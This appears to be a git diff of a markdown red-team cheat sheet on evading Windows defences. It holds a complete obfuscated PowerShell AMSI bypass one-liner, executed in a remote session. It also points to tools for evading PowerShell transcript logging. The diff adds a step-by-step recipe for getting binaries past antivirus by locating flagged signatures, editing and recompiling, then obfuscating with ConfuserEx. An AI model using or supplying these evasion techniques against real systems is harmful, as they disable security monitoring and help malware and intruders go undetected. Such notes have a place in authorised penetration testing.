@@ -5,7 +5,7 @@
 - AntiMalware Scan Interface (AMSI)
 - Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
 
-#### AMSI Bypass
+## AMSI Bypass
 - https://amsi.fail/
 - Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
 ```
@@ -16,7 +16,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
 ```
 
-### Invisi-shell
+## Invisi-shell
 - Bypasses Sytem-Wide transcript
 - https://github.com/OmerYa/Invisi-Shell
 - Type exit from the new PowerShell session to complete the clean-up.
@@ -39,6 +39,21 @@ winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
 
 ## Com objects
 - https://github.com/bohops/WSMan-WinRM
+
+## AV Bypass
+- Defendercheck to check for signatures https://github.com/matterpreter/DefenderCheck
+- Run Defendercheck ```DefenderCheck.exe <PATH TO BINARY>```
+- Replace string which gets detected.
+- Recompile and check again!
+
+- Obfuscate binary with https://github.com/mkaring/ConfuserEx
+- Launch ConfuserEx
+- In Project tab select the Base Directory where the binary file is located.
+- In Project tab Select the Binary File that we want to obfuscate.
+- In Settings tab add the rules.
+- In Settings tab edit the rule and select the preset as `Normal`.
+- In Protect tab click on the protect button.
+- We will find the new obfuscated binary in the Confused folder under the Base Directory.
 
 ## General
 #### Disable AV monitoring
